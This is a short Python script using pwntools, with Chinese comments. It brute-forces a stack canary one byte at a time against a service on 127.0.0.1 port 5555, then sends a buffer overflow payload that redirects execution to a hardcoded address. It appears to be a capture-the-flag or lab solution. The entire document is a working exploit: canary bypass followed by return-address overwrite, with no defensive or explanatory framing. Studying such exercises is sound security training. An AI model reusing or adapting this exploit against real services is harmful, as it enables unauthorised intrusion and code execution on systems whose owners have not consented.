from pwn import *

# 逐字节爆破，获取canary
def get_canary():
    # 逐字节爆破
    canary = b"\x00"
    while len(canary) < 8:
        for int_byte in range(256):
            io = remote("127.0.0.1", 5555)
            io.recv()
            byte = bytes.fromhex("{:02x}".format(int_byte))

            # 尝试byte是否会导致程序崩溃
            # 若不会，说明当前字节正确，直接跳至下一字节
            try:
                io.send(b"A" * 104 + canary + byte)
                io.recv()
                canary += byte
                break
            except:
                pass
            finally:
                io.close()
    
    return canary

canary = get_canary()
print(canary)

io = remote("127.0.0.1", 5555)
target_address = 0x400BC6
payload = b"A" * 104 + canary + b"A" * 8 + p64(target_address)
print(io.recv())
io.send(payload)
print(io.recv())
